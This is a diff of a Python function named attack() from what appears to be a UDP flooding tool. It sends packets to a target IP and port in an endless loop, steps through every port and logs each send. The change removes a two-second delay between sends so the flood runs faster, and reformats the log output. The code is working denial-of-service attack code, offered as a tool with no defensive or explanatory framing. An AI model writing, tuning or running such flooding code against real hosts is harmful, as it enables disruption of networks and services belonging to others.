@@ -50,10 +50,9 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
     try:
         while True:
             sock.sendto(data, (ip, port))
-            time.sleep(2)
             sent += 1
-            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip}\033[37m[{port}] \033[36mSent•> \033[37m{sent} \033[94mthreads\033[38;5;220m•> {threading.get_ident()}")
-            log_message(f"\033[38;5;220mIp Address\033[94m•> {ip} \033[32m[{port}]\033[94mSent•> \033[31m{sent} \033[93mnum\033[37m•> {packet_size}")
+            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip}\033[33m:\033[37m{port} \033[36mSent•> \033[37m{sent} \033[94mthreads\033[38;5;220m•> {threading.get_ident()}")
+            log_message(f"\033[38;5;220mIp Address\033[94m•> {ip} \033[37m:\033[32m{port} \033[94mSent•> \033[31m{sent} \033[93mpacket_size\033[37m•> {packet_size}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
